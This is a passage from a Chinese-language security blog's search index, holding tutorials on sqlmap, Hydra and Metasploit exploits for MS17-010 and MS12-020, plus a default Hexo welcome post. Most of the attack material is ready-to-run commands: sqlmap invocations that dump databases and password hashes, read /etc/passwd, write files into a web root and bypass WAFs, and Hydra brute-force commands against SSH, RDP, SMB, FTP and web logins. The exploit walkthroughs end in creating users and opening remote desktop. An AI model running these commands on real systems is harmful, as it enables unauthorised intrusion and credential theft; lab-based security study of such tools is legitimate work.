(Unauthorized)                  忽略HTTP错误401(未经授权)\n--proxy=PROXY       Use a proxy to connect to the target URL              使用代理连接到目标网址\n--proxy-cred=PRO..  Proxy authentication credentials (name:password)      代理认证证书(name:password) \n--proxy-file=PRO..  Load proxy list from a file                           从文件中加载代理列表\n--ignore-proxy      Ignore system default proxy settings                  忽略系统默认代理设置\n--tor               Use Tor anonymity network                             使用Tor匿名网络\n--tor-port=TORPORT  Set Tor proxy port other than default                 设置Tor代理端口而不是默认值\n--tor-type=TORTYPE  Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5) 设置Tor代理类型\n--check-tor         Check to see if Tor is used properly                  检查Tor是否正确使用\n--delay=DELAY       Delay in seconds between each HTTP request             每个HTTP请求之间的延迟（秒）\n--timeout=TIMEOUT   Seconds to wait before timeout connection (default 30) 秒超时连接前等待（默认30）\n--retries=RETRIES   Retries when the connection timeouts (default 3)       连接超时时重试（默认值3）\n--randomize=RPARAM  Randomly change value for given parameter(s)           随机更改给定参数的值(s)\n--safe-url=SAFEURL  URL address to visit frequently during testing         在测试期间频繁访问的URL地址\n--safe-post=SAFE..  POST data to send to a safe URL                        POST数据发送到安全URL\n--safe-req=SAFER..  Load safe HTTP request from a file                     从文件加载安全HTTP请求\n--safe-freq=SAFE..  Test requests between two visits to a given safe URL   在两次访问给定安全网址之间测试请求\n--skip-urlencode    Skip URL encoding of payload data                      跳过有效载荷数据的URL编码\n--csrf-token=CSR..  Parameter used to hold anti-CSRF token                 参数用于保存anti-CSRF令牌\n--csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token        提取anti-CSRF URL地址访问令牌\n--force-ssl         Force usage of SSL/HTTPS                               强制使用SSL / HTTPS\n--hpp               Use HTTP parameter pollution method                    使用HTTP参数pollution的方法\n--eval=EVALCODE     Evaluate provided Python code before the request (e.g. 评估请求之前提供Python代码\n                    \"import hashlib;id2=hashlib.md5(id).hexdigest()\")\n\nOptimization（优化）:\nThese options can be used to optimize the performance of sqlmap    这些选项可用于优化sqlmap的性能\n\n-o                  Turn on all optimization switches                        开启所有优化开关\n--predict-output    Predict common queries output                            预测常见的查询输出\n--keep-alive        Use persistent HTTP(s) connections                       使用持久的HTTP（S）连接\n--null-connection   Retrieve page length without actual HTTP response body   从没有实际的HTTP响应体中检索页    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)    最大的HTTP（S）请求并发量（默认为1）\n\nInjection（注入）:\nThese options can be used to specify which parameters to test for,\nprovide custom injection payloads and optional tampering scripts \n这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。\n\n-p TESTPARAMETER    Testable parameter(s)                                      可测试的参数（S）\n--skip=SKIP         Skip testing for given parameter(s)                        跳过对给定参数的测试\n--skip-static       Skip testing parameters that not appear to be dynamic      跳过测试不显示为动态的参数\n--param-exclude=..  Regexp to exclude parameters from testing (e.g. \"ses\")     使用正则表达式排除参数进行测试（e.g. \"ses\"）\n--dbms=DBMS         Force back-end DBMS to this value                          强制后端的DBMS为此值  \n--dbms-cred=DBMS..  DBMS authentication credentials (user:password)            DBMS认证凭证(user:password) \n--os=OS             Force back-end DBMS operating system to this value         强制后端的DBMS操作系统为这个值\n--invalid-bignum    Use big numbers for invalidating values                    使用大数字使值无效\n--invalid-logical   Use logical operations for invalidating values             使用逻辑操作使值无效\n--invalid-string    Use random strings for invalidating values                 使用随机字符串使值无效\n--no-cast           Turn off payload casting mechanism                         关闭有效载荷铸造机制\n--no-escape         Turn off string escaping mechanism                         关闭字符串转义机制\n--prefix=PREFIX     Injection payload prefix string                            注入payload字符串前缀\n--suffix=SUFFIX     Injection payload suffix string                            注入payload字符串后缀  \n--tamper=TAMPER     Use given script(s) for tampering injection data           使用给定的脚本（S）篡改注入数据\n \nDetection（检测）:\nThese options can be used to customize the detection phase 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。\n\n--level=LEVEL       Level of tests to perform (1-5, default 1)          执行测试的等级（1-5，默认为1）\n--risk=RISK         Risk of tests to perform (1-3, default 1)           执行测试的风险（0-3，默认为1）\n--string=STRING     String to match when query is evaluated to True     查询时有效时在页面匹配字符串 \n--not-string=NOT..  String to match when query is evaluated to False    当查询求值为无效时匹配的字符串\n--regexp=REGEXP     Regexp to match when query is evaluated to True     查询时有效时在页面匹配正则表达式\n--code=CODE         HTTP code to match when query is evaluated to True  当查询求值为True时匹配的HTTP代码\n--text-only         Compare pages based only on the textual content     仅基于在文本内容比较网页\n--titles            Compare pages based only on their titles            仅根据他们的标题进行比较\n \nTechniques（技巧）:\nThese options can be used to tweak testing of specific SQL injection\ntechniques \n这些选项可用于调整具体的SQL注入测试。 \n\n--technique=TECH    SQL injection techniques to use (default \"BEUSTQ\")      SQL注入技术测试（默认BEUST）\n--time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)          DBMS响应的延迟时间（默认为5秒）\n--union-cols=UCOLS  Range of columns to test for UNION query SQL injection  定列范围用于测试UNION查询注入\n--union-char=UCHAR  Character to use for bruteforcing number of columns     用于暴力猜解列数的字符\n--union-from=UFROM  Table to use in FROM part of UNION query SQL injection  要在UNION查询SQL注入的FROM部分使用的表\n--dns-domain=DNS..  Domain name used for DNS exfiltration attack            域名用于DNS漏出攻击\n--second-order=S..  Resulting page URL searched for second-order response   生成页面的URL搜索为second-order响应\n\nFingerprint（指纹）:\n-f, --fingerprint   Perform an extensive DBMS version fingerprint           执行检查广泛的DBMS版本指纹\nEnumeration（枚举）:\nThese options can be used to enumerate the back-end database\nmanagement system information, structure and data contained in the\ntables. Moreover you can run your own SQL statements                  \n这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。\n\n-a, --all           Retrieve everything                             检索一切\n-b, --banner        Retrieve DBMS banner                            检索数据库管理系统的标识  \n--current-user      Retrieve DBMS current user                      检索数据库管理系统的标识  \n--current-db        Retrieve DBMS current database                  检索数据库管理系统当前数据库  \n--hostname          Retrieve DBMS server hostname                   检索数据库服务器的主机名\n--is-dba            Detect if the DBMS current user is DBA          检测DBMS当前用户是否DBA  \n--users             Enumerate DBMS users                            枚举数据库管理系统用户\n--passwords         Enumerate DBMS users password hashes            枚举数据库管理系统用户密码哈希\n--privileges        Enumerate DBMS users privileges                 枚举数据库管理系统用户的权限  \n--roles             Enumerate DBMS users roles                      枚举数据库管理系统用户的角色  \n--dbs               Enumerate DBMS databases                        枚举数据库管理系统数据库\n--tables            Enumerate DBMS database tables                  枚举的DBMS数据库中的表  \n--columns           Enumerate DBMS database table columns           枚举DBMS数据库表列\n--schema            Enumerate DBMS schema                           枚举数据库架构\n--count             Retrieve number of entries for table(s)         检索表的条目数\n--dump              Dump DBMS database table entries                转储数据库管理系统的数据库中的表项\n--dump-all          Dump all DBMS databases tables entries               转储数据库管理系统的数据库中的表项\n--search            Search column(s), table(s) and/or database name(s)   搜索列（S），表（S）和/或数据库名称（S）\n--comments          Retrieve DBMS comments                               检索数据库的comments(注释、评论)\n-D DB               DBMS database to enumerate                           要进行枚举的数据库名 \n-T TBL              DBMS database table(s) to enumerate                  要进行枚举的数据库表\n-C COL              DBMS database table column(s) to enumerate           要进行枚举的数据库列 \n-X EXCLUDECOL       DBMS database table column(s) to not enumerate       要不进行枚举的数据库列 \n-U USER             DBMS user to enumerate                               用来进行枚举的数据库用户 \n--exclude-sysdbs    Exclude DBMS system databases when enumerating tables   枚举表时排除系统数据库 \n--pivot-column=P..  Pivot column name                                       主列名称\n--where=DUMPWHERE   Use WHERE condition while table dumping                 使用WHERE条件进行表转储\n--start=LIMITSTART  First query output entry to retrieve                    第一个查询输出进入检索\n--stop=LIMITSTOP    Last query output entry to retrieve                     最后查询的输出进入检索\n--first=FIRSTCHAR   First query output word character to retrieve           第一个查询输出字的字符检索 \n--last=LASTCHAR     Last query output word character to retrieve            最后查询的输出字字符检索 \n--sql-query=QUERY   SQL statement to be executed                            要执行的SQL语句\n--sql-shell         Prompt for an interactive SQL shell                     提示交互式SQL的shell\n--sql-file=SQLFILE  Execute SQL statements from given file(s)               从给定文件执行SQL语句\n \nBrute force（蛮力）:\nThese options can be used to run brute force checks         这些选项可以被用来运行蛮力检查。\n\n--common-tables     Check existence of common tables        检查存在共同表 \n--common-columns    Check existence of common columns       检查存在共同列\n \nUser-defined function injection（用户自定义函数注入）:\nThese options can be used to create custom user-defined functions   这些选项可以用来创建用户自定义函数。\n\n--udf-inject        Inject custom user-defined functions        注入用户自定义函数  \n--shared-lib=SHLIB  Local path of the shared library            共享库的本地路径 \n \nFile system access（访问文件系统）:\nThese options can be used to access the back-end database management      \nsystem underlying file system\n这些选项可以被用来访问后端数据库管理系统的底层文件系统。\n\n--file-read=RFILE   Read a file from the back-end DBMS file system        从后端的数据库管理系统文件系统读取文件  \n--file-write=WFILE  Write a local file on the back-end DBMS file system   编辑后端的数据库管理系统文件系统上的本地文件\n--file-dest=DFILE   Back-end DBMS absolute filepath to write to           后端的数据库管理系统写入文件的绝对路径\n \nOperating system access（操作系统访问）:\nThese options can be used to access the back-end database management\nsystem underlying operating system  \n这些选项可以用于访问后端数据库管理系统的底层操作系统。\n\n--os-cmd=OSCMD      Execute an operating system command                     执行操作系统命令 \n--os-shell          Prompt for an interactive operating system shell        交互式的操作系统的shell\n--os-pwn            Prompt for an OOB shell, Meterpreter or VNC             获取一个OOB shell，meterpreter或VNC \n--os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC   一键获取一个OOB shell，meterpreter或VNC \n--os-bof            Stored procedure buffer overflow exploitation           存储过程缓冲区溢出利用\n--priv-esc          Database process user privilege escalation              数据库进程用户权限提升\n--msf-path=MSFPATH  Local path where Metasploit Framework is installed      Metasploit Framework本地的安装路径\n--tmp-path=TMPPATH  Remote absolute path of temporary files directory       远程临时文件目录的绝对路径\n \nwindows registry access（Windows注册表访问）:\nThese options can be used to access the back-end database management\nsystem Windows registry     \n这些选项可以被用来访问后端数据库管理系统Windows注册表。\n\n--reg-read          Read a Windows registry key value           读一个Windows注册表项值\n--reg-add           Write a Windows registry key value data     写一个Windows注册表项值数据\n--reg-del           Delete a Windows registry key value         删除Windows注册表键值\n--reg-key=REGKEY    Windows registry key                        Windows注册表键 \n--reg-value=REGVAL  Windows registry key value                  Windows注册表项值 \n--reg-data=REGDATA  Windows registry key value data             Windows注册表键值数据  \n--reg-type=REGTYPE  Windows registry key value type             Windows注册表项值类型\n \nGeneral（一般）:\nThese options can be used to set some general working parameters    这些选项可以用来设置一些一般的工作参数。 \n\n-s SESSIONFILE      Load session from a stored (.sqlite) file                   保存和恢复检索会话文件的所有数据\n-t TRAFFICFILE      Log all HTTP traffic into a textual file                    记录所有HTTP流量到一个文本文件中\n--batch             Never ask for user input, use the default behaviour         从不询问用户输入，使用所有默认配置。 \n--binary-fields=..  Result fields having binary values (e.g. \"digest\")          具有二进制值的结果字段\n--charset=CHARSET   Force character encoding used for data retrieval            强制用于数据检索的字符编码\n--crawl=CRAWLDEPTH  Crawl the website starting from the target URL              从目标网址开始抓取网站\n--crawl-exclude=..  Regexp to exclude pages from crawling (e.g. \"logout\")       正则表达式排除网页抓取\n--csv-del=CSVDEL    Delimiting character used in CSV output (default \",\")       分隔CSV输出中使用的字符\n--dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)       转储数据的格式\n--eta               Display for each output the estimated time of arrival       显示每个输出的预计到达时间\n--flush-session     Flush session files for current target                      刷新当前目标的会话文件\n--forms             Parse and test forms on target URL                          在目标网址上解析和测试表单\n--fresh-queries     Ignore query results stored in session file                 忽略在会话文件中存储的查询结果\n--hex               Use DBMS hex function(s) for data retrieval                 使用DBMS hex函数进行数据检索\n--output-dir=OUT..  Custom output directory path                                自定义输出目录路径\n--parse-errors      Parse and display DBMS error messages from responses        解析和显示响应中的DBMS错误消息\n--save=SAVECONFIG   Save options to a configuration INI file                    保存选项到INI配置文件\n--scope=SCOPE       Regexp to filter targets from provided proxy log            使用正则表达式从提供的代理日志中过滤目标\n--test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)           根据有效负载和/或标题(e.g. ROW)选择测试\n--test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)       根据有效负载和/或标题跳过测试（e.g. BENCHMARK）\n--update            Update sqlmap                                                更新SqlMap\n \nMiscellaneous（杂项）:\n \n-z MNEMONICS        Use short mnemonics (e.g. \"flu,bat,ban,tec=EU\")         使用简短的助记符\n--alert=ALERT       Run host OS command(s) when SQL injection is found      在找到SQL注入时运行主机操作系统命令\n--answers=ANSWERS   Set question answers (e.g. \"quit=N,follow=N\")           设置问题答案\n--beep              Beep on question and/or when SQL injection is found     发现SQL注入时提醒\n--cleanup           Clean up the DBMS from sqlmap specific UDF and tables   SqlMap具体的UDF和表清理DBMS \n--dependencies      Check for missing (non-core) sqlmap dependencies        检查是否缺少（非内核）sqlmap依赖关系\n--disable-coloring  Disable console output coloring                         禁用控制台输出颜色\n--gpage=GOOGLEPAGE  Use Google dork results from specified page number      使用Google dork结果指定页码\n--identify-waf      Make a thorough testing for a WAF/IPS/IDS protection    对WAF / IPS / IDS保护进行全面测试\n--skip-waf          Skip heuristic detection of WAF/IPS/IDS protection      跳过启发式检测WAF / IPS / IDS保护\n--mobile            Imitate smartphone through HTTP User-Agent header       通过HTTP User-Agent标头模仿智能手机\n--offline           Work in offline mode (only use session data)            在离线模式下工作（仅使用会话数据）\n--page-rank         Display page rank (PR) for Google dork results          Google dork结果显示网页排名（PR）\n--purge-output      Safely remove all content from output directory         安全地从输出目录中删除所有内容\n--smart             Conduct thorough tests only if positive heuristic(s)    只有在正启发式时才进行彻底测试\n--sqlmap-shell      Prompt for an interactive sqlmap shell                  提示交互式sqlmap shell\n--wizard            Simple wizard interface for beginner users              给初级用户的简单向导界面\n```\n\n#### SQLMap基本使用命令\n``` bash\n# 基础用法：\n$ sqlmap.py -u “注入地址” -v 1 --dbs   // 列举数据库\n$ sqlmap.py -u “注入地址” -v 1 --current-db   // 当前数据库\n$ sqlmap.py -u “注入地址” -v 1 --users    // 列数据库用户\n$ sqlmap.py -u “注入地址” -v 1 --current-user  // 当前用户\n$ sqlmap.py -u “注入地址” -v 1 --tables -D “数据库”   // 列举数据库的表名\n$ sqlmap.py -u “注入地址” -v 1 --columns -T “表名” -D “数据库”   // 获取表的列名\n$ sqlmap.py -u “注入地址” -v 1 --dump -C “字段,字段” -T “表名” -D “数据库”   // 获取表中的数据，包含列\n\n# cookie注入\n$ sqlmap.py -u 注入点 --cookie \"参数\" --tables --level 2\n\n# post登录框注入\n$ sqlmap.py -r 从文件读取数据 -p 指定的参数 --tables\n$ sqlmap.py -u 登录的地址 --forms 自动判断注入\n$ sqlmap.py -u 登录的地址 --data \"指定参数\"\n\n# 绕过waf防火墙\n$ sqlmap.py -u 注入点 -v 3 --dbs  --batch --tamper space2morehash.py,space2hash.py,base64encode.py,charencode.py\n\n# 1)判断当前用户是否是dba\n$ python sqlmap.py -u \"url\" --is-dba -v 1\n# 2)--users:列出数据库管理系统用户\n$ python sqlmap.py -u \"url\" --users -v 0\n# 3)--passwords:数据库用户密码(hash)\n$ python sqlmap.py -u \"url\" --passwords -v 0\n$ python sqlmap.py -u \"url\" --passwords -U sa -v 0\n# 4)查看用户权限\n$ python sqlmap.py -u \"url\" --privileges -v 0\n$ python sqlmap.py -u \"url\" --privileges -U postgres -v 0\n# 5)--dbs可以利用的数据库\n$ python sqlmap.py -u \"url\" --dbs -v 0\n# 6)--tables列数据库表\n$ python sqlmap.py -u \"url\" --tables -D \"information_scheam\"\n# -D:指定数据名称\n# 7)--columns 列出表中的列名\n$ python sqlmap.py -u \"url\" --columns -T \"user\" -D \"mysql\" -v 1\n# -T:指定表名，-D:指定库名\n# 8)--dump列表中指定列的内容\n$ python sqlmap.py -u \"url\" --dump -T \"users\" -D \"testdb\"\n# -C:可以指定字段\n# 指定列的范围为2到4\n$ python sqlmap.py -u \"url\" --dump -T \"users\" -D \"testdb\"  --start 2 --stop 4 -v 0\n# 9)--dumap-all列出所有数据库，所有表内容\n$ python sqlmap.py -u \"url\" --dump-all -v 0\n# 只列出用户自己新建的数据库和表的内容\n$ python sqlmap.py -u \"url\" --dump-all --exclude-sysdbs -v 0\n# 10)--file读取文件内容[load_file()函数]\n$ python sqlmap.py -u \"url\" --file /etc/password\n# 11)执行SQL\n$ python sqlmap.py -u \"url\" --sql-shell\n# 12)-p 指定参数\n$ python sqlmap.py -u \"url\" -v 1 -p \"id\"\n# -p可以指定多参数-p \"cat,id\"\n# 13)POST提交\n$ python sqlmap.py -u \"url\" --method POST --data \"id=1\"\n# 14)COOKIE提交\n$ python sqlmap.py -u \"url\" --cookie \"id=1\" -v 1\n# cookie值可以由TamperData抓取\n# 15)refer欺骗\n$ python sqlmap.py -u \"url\" --refer \"url\" -v 3\n# 16)使用自定义user-agent或者user-agents.txt\n$ python sqlmap.py -u \"url\" --user-agent \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\" -v 3\n$ python sqlmap.py -u \"url\" -v 1 -a \"./txt/user-agents.txt\"\n# 17)使用多线程猜解\n$ python sqlmap.py -u \"url\" -v 1 --current-user --threads 3\n# 18)指定数据库，绕过SQLMAP的自动检测\n$ python sqlmap.py -u \"url\" -v 2 --dbms \"PostgreSQL\"\n# 19)指定操作系统绕过SQLMAP自动检测\n$ python sqlmap.py -u \"url\" -v 2 --os \"Windows\"\n# 20)--prefix and --postfix自定义payload\n$ python sqlmap.py -u \"url\" -v 3 -p \"id\" --prefix \"'\" --postfix \"and 'test'='test\"\n# 21)union注入测试\n$ python sqlmap.py -u \"url\" --union-test -v -1\n# 22)配合order by\n$ python sqlmap.py -u \"url\" --union-test --union-tech orderby -v 1\n$ 23)python sqlmap.py -u \"url\" -v 1 --union-use --banner\n$ 24)python sqlmap.py -u \"url\" -v 5 --union-use --current-user\n$ 25)python sqlmap.py -u \"url\" -v 1 --union-use --dbs\n\n# 简单的注入流程\n# 1.读取数据库版本，当前用户，当前数据库\n$ sqlmap -u http://www.evil0x.com/ test.php?p=2 -f -b –current-user –current-db -v 1\n# 2.判断当前数据库用户权限\n$ sqlmap -u http://www.evil0x.com/ test.php?p=2 –privileges -U 用户名 -v 1\n$ sqlmap -u http://www.evil0x.com/ test.php?p=2 –is-dba -U 用户名 -v 1\n# 3.读取所有数据库用户或指定数据库用户的密码\n$ sqlmap -u http://www.evil0x.com/ test.php?p=2 –users –passwords -v 2\n$ sqlmap -u http://www.evil0x.com/ test.php?p=2 –passwords -U root -v 2\n# 4.获取所有数据库\n$ sqlmap -u http://www.evil0x.com/ test.php?p=2 –dbs -v 2\n# 5.获取指定数据库中的所有表\n$ sqlmap -u http://www.evil0x.com/ test.php?p=2 –tables -D mysql -v 2\n# 6.获取指定数据库名中指定表的字段\n$ sqlmap -u http://www.evil0x.com/ test.php?p=2 –columns -D mysql -T users -v 2\n# 7.获取指定数据库名中指定表中指定字段的数据\n$ sqlmap -u http://www.evil0x.com/ test.php?p=2 –dump -D mysql -T users -C “username,password” -s “sqlnmapdb.log” -v 2\n# 8.file-read读取web文件\n$ sqlmap -u http://www.evil0x.com/ test.php?p=2 –file-read “/etc/passwd” -v 2\n# 9.file-write写入文件到web\n$ sqlmap -u http://www.evil0x.com/ test.php?p=2 –file-write /localhost/mm.php –file-dest\n\n# 将本地的test.txt写入到站点服务器的html目录下\n$ sqlmap.py -u \"http://www.nxadmin.com/sql-injection.php?id=1\" –file-write /test/test.txt –file-dest /var/www/html/1.txt\n```\n\n","tags":["SQLMap"],"categories":["SQLMap"]},{"title":"hydra使用教程","url":"/posts/e8807699/","content":"\n\n>**Hydra(九头蛇)是黑客组织thc的一款开源密码攻击工具，功能十分强大，支持多种协议的破解，在Kali Linux的终端中执行hydra -h可以看到详细介绍**\n\n#### Hydrag攻击演示\n\n>实验环境：\n>攻击机器：Kali-Linux 172.16.31.102\n>客户机器：CentOS 7 172.16.31.111\n<!-- more -->\n**一、\t准备好攻击字典（可以自己随机生成或者百度字典）**\n ![image](https://static-hk.gov-cn.cn/static/images/e8807699/images-1.png)\n**二、\t开始破解**\n  ![image](https://static-hk.gov-cn.cn/static/images/e8807699/images-2.png)\n**三、\t破解成功**\n>[22][ssh] host: 172.16.31.111   login: root   password: toor\n>这里用户为root、密码为toor\n\n**四、解决方案**\n>1、超复杂密码(超复杂密码可以让攻击者破解很久，哪怕有在强大的字典，但是我个人还是不推荐使用密码，因为说不定人家就破解了)\n>2、秘钥登录(可以防止密码破解，个人比较推荐，但是实际情况还得看实际情况)\n\n#### Hydra使用教程\n``` bash\n# 参数详解：\n-R 根据上一次进度继续破解\n-S 使用SSL协议连接\n-s 指定端口\n-l 指定用户名\n-L 指定用户名字典(文件)\n-p 指定密码破解\n-P 指定密码字典(文件)\n-e 空密码探测和指定用户密码探测(ns)\n-C 用户名可以用:分割(username:password)可以代替-l username -p password\n-o 输出文件\n-t 指定多线程数量，默认为16个线程\n-vV 显示详细过程\nserver 目标IP\nservice 指定服务名(telnet ftp pop3 mssql mysql ssh ssh2......)\n```\n\n``` bash\n# 使用案例：\n# 使用hydra破解ssh的密码\n$ hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh\n\n# 破解https：\n$ hydra -m /index.php -l username -P pass.txt IP https\n\n# 破解teamspeak：\n$ hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak\n\n# 破解cisco：\n$ hydra -P pass.txt IP cisco\n$ hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable\n\n# 破解smb：\n$ hydra -l administrator -P pass.txt IP smb\n\n# 破解pop3：\n$ hydra -l muts -P pass.txt my.pop3.mail pop3\n\n# 破解rdp：\n$ hydra IP rdp -l administrator -P pass.txt -V\n\n# 破解http-proxy：\n$ hydra -l admin -P pass.txt http-proxy://10.36.16.18\n\n# 破解telnet\n$ hydra IP telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V\n\n# 破解ftp：\n$ hydra IP ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV\n$ hydra IP ftp -l 用户名 -P 密码字典 -e ns -vV\n# get方式提交，破解web登录：\n$ hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns IP http-get /admin/\n$ hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f IP http-get /admin/index.php\n# post方式提交，破解web登录：\n# 该软件的强大之处就在于支持多种协议的破解，同样也支持对于web用户界面的登录破解，get方式提交的表单比较简单，这里通过post方式提交密码破解提供思路。该工具有一个不好的地方就是，如果目标网站登录时候需要验证码就无法破解了。带参数破解如下：\n# <form action=\"index.php\" method=\"POST\">\n# <input type=\"text\" name=\"name\" /><BR><br>\n# <input type=\"password\" name=\"pwd\" /><br><br>\n# <input type=\"submit\" name=\"sub\" value=\"提交\">\n# </form>\n# 假设有以上一个密码登录表单，我们执行命令：\n$ hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form “index.php:name=^USER^&pwd=^PASS^:<title>invalido</title>”\n# 说明：破解的用户名是admin，密码字典是pass.lst，破解结果保存在ok.lst，-t 是同时线程数为1，-f 是当破解了一个密码就停止，ip 是本地，就是目标ip，http-post-form表示破解是采用http 的post 方式提交的表单密码破解。\n# 后面参数是网页中对应的表单字段的name 属性，后面<title>中的内容是表示错误猜解的返回信息提示，可以自定义。\n```\n\n","tags":["爆破"],"categories":["爆破"]},{"title":"MSF利用MS17-010模块讲解","url":"/posts/af85dfeb/","content":"\n\n>**MSF是集成在Kali上的一个工具，我们可用利用MSF做一些漏洞利用，接下来我们看看吧！**\n>2017年5月，被称为近10年来影响范围最广泛“最嚣张”的WannaCry勒索病毒席卷全球，据统计，全球共有150多个国家超30万台终端被感染，波及政府、学校、医院、金融、航班等各行各业。\n>一旦中了WannaCry病毒，则电脑文件会被“加密劫持”，黑客要求受害者支付高昂赎金（比特币）才能拿到解密秘钥。当时互联网上有很多人确实尝试通过支付赎金解决“被挟持的电脑”，毕竟多年的工作和学习资料比起赎金来讲，价值更大。而实际上，很多人即便打钱过去，也无济于事。\n<!-- more -->\n\n#### MS17-010漏洞复现\n\n>实验环境：\n>攻击机器：Kali-Linux 172.16.31.101\n>客户机器：Windows7 172.16.31.102\n\n**一、\t搜索MS17-010相关利用代码**\n ![image](https://static-hk.gov-cn.cn/static/images/af85dfeb/image-1.png)\n \n**二、\t检测目标机器是否存在漏洞**\n>查看配置选项\n  ![image](https://static-hk.gov-cn.cn/static/images/af85dfeb/image-2.png)\n ![image](https://static-hk.gov-cn.cn/static/images/af85dfeb/image-3.png)\n \n \n**三、\t加载攻击模块**\n>查看配置选项\n ![image](https://static-hk.gov-cn.cn/static/images/af85dfeb/image-4.png)\n >配置选项\n ![image](https://static-hk.gov-cn.cn/static/images/af85dfeb/image-5.png)\n \n**四、\t发起攻击**\n ![image](https://static-hk.gov-cn.cn/static/images/af85dfeb/image-6.png)\n \n**五、\t获取对方电脑桌面**\n ![image](https://static-hk.gov-cn.cn/static/images/af85dfeb/image-7.png)\n \n**六、\t获取shell权限（命令行权限）**\n ![image](https://static-hk.gov-cn.cn/static/images/af85dfeb/image-8.png)\n>创建用户\n ![image](https://static-hk.gov-cn.cn/static/images/af85dfeb/image-9.png)\n  >提权\n ![image](https://static-hk.gov-cn.cn/static/images/af85dfeb/image-10.png)\n>开启远程权限\n ![image](https://static-hk.gov-cn.cn/static/images/af85dfeb/image-11.png)\n \n**七、\t测试能否远程连接**\n ![image](https://static-hk.gov-cn.cn/static/images/af85dfeb/image-12.png)\n ![image](https://static-hk.gov-cn.cn/static/images/af85dfeb/image-13.png)\n >完成入侵\n**注明：MS17-010在MSF里面属于中等使用难度，涉及了扫描、配置回链方式、桌面爬图、提权手段、是非常好的学习对象。**\n\n\n#### MS17-010修复方案\n>**更新补丁即可**","tags":["CVE","Metasploit"],"categories":["CVE","Metasploit"]},{"title":"MSF利用MS12-020模块讲解","url":"/posts/274a16bc/","content":"\n\n>**MSF是集成在Kali上的一个工具，我们可用利用MSF做一些漏洞利用，接下来我们看看吧！**\n>若存在该漏洞有可能造成被攻击系统蓝屏、重启或任意代码执行。 \n>此安全漏洞。如果攻击者向受影响的系统发送一系列特制 RDP 数据包，则这些漏洞中较严重的漏洞可能允许远程执行代码。默认情况下，任何 Windows 操作系统都未启用远程桌面协议 (RDP)。没有启用 RDP 的系统不受威胁。\n<!-- more -->\n\n#### MS12-020漏洞利用复现\n\n>实验环境：\n>攻击机器：Kali-Linux 172.16.31.101\n>客户机器：Windows7 172.16.31.102\n\n**一、\t进入MSF命令行界面**\n ![image](https://static-hk.gov-cn.cn/static/images/274a16bc/image-1.png)\n**二、\t查找MS12-020模块漏洞代码**\n  ![image](https://static-hk.gov-cn.cn/static/images/274a16bc/image-2.png)\n**三、\t使用该漏洞利用代码并查看使用方法选项**\n  ![image](https://static-hk.gov-cn.cn/static/images/274a16bc/image-3.png)\n**四、\t设置参数**\n  ![image](https://static-hk.gov-cn.cn/static/images/274a16bc/image-4.png)\n**五、\t客户机攻击前各项状态**\n  ![image](https://static-hk.gov-cn.cn/static/images/274a16bc/image-5.png)\n**六、\t攻击**\n  ![image](https://static-hk.gov-cn.cn/static/images/274a16bc/image-6.png)\n**七、\t攻击后客户机状态**\n ![image](https://static-hk.gov-cn.cn/static/images/274a16bc/image-7.png)\n\n#### MS12-020修复方案\n>**更新补丁即可**","tags":["CVE","Metasploit"],"categories":["CVE","Metasploit"]},{"title":"Hello World","url":"/posts/4a17b156/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n"}]